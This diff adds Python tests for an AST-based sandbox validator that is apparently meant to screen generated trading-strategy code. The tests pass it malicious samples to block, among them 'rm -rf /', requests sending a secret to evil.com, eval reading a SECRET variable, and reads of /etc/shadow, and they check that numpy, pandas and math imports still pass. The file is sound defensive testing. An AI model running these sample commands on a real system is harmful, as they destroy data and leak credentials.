@@ -282,6 +282,102 @@ class TestValidateNoDangerousCode:
         assert ok is False
 
 
+# ─── Task 16.2: AST 기반 보안 샌드박스 강화 tests ──────────
+
+
+class TestASTSecuritySandbox:
+    """Task 16.2 — AST NodeVisitor 기반 _validate_no_dangerous_code 강화 테스트.
+
+    10종 악의적 코드 + 정상 전략 통과 확인.
+    """
+
+    # 악의적 코드 10종
+
+    def test_import_os_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code("import os\nos.system('rm -rf /')")
+        assert ok is False
+        assert "os" in err.lower() or "not allowed" in err
+
+    def test_import_subprocess_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code("import subprocess\nsubprocess.run(['ls'])")
+        assert ok is False
+
+    def test_import_socket_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "import socket\ns = socket.socket()\ns.connect(('evil.com', 80))"
+        )
+        assert ok is False
+
+    def test_import_requests_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "import requests\nrequests.post('http://evil.com', data=secret)"
+        )
+        assert ok is False
+
+    def test_exec_call_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "exec('import os; os.remove(\"/etc/passwd\")')"
+        )
+        assert ok is False
+        assert "exec" in err.lower() or "not allowed" in err
+
+    def test_eval_call_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "result = eval('__import__(\"os\").getenv(\"SECRET\")')"
+        )
+        assert ok is False
+        assert "eval" in err.lower() or "not allowed" in err
+
+    def test_compile_call_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "code = compile('import os', '<string>', 'exec')"
+        )
+        assert ok is False
+
+    def test_dunder_import_call_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "os = __import__('os')\nos.remove('/etc/passwd')"
+        )
+        assert ok is False
+
+    def test_open_call_ast_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "with open('/etc/shadow', 'r') as f:\n    print(f.read())"
+        )
+        assert ok is False
+
+    def test_from_import_httpx_blocked(self):
+        ok, err = _validate_no_dangerous_code(
+            "from httpx import get\nget('http://evil.com/exfiltrate')"
+        )
+        assert ok is False
+
+    # 정상 전략 통과 테스트
+
+    def test_good_strategy_passes(self):
+        code = _good_strategy_code()
+        ok, err = _validate_no_dangerous_code(code)
+        assert ok is True, f"정상 전략이 차단됨: {err}"
+
+    def test_numpy_import_allowed(self):
+        ok, err = _validate_no_dangerous_code("import numpy as np\nx = np.mean([1, 2, 3])")
+        assert ok is True, err
+
+    def test_pandas_import_allowed(self):
+        ok, err = _validate_no_dangerous_code("import pandas as pd\ndf = pd.DataFrame()")
+        assert ok is True, err
+
+    def test_math_import_allowed(self):
+        ok, err = _validate_no_dangerous_code("import math\nresult = math.sqrt(2)")
+        assert ok is True, err
+
+    def test_src_import_allowed(self):
+        ok, err = _validate_no_dangerous_code(
+            "from src.core.models import Signal, SignalType"
+        )
+        assert ok is True, err
+
+
 # ─── _extract_code_block tests ───────────────────────────
 
 
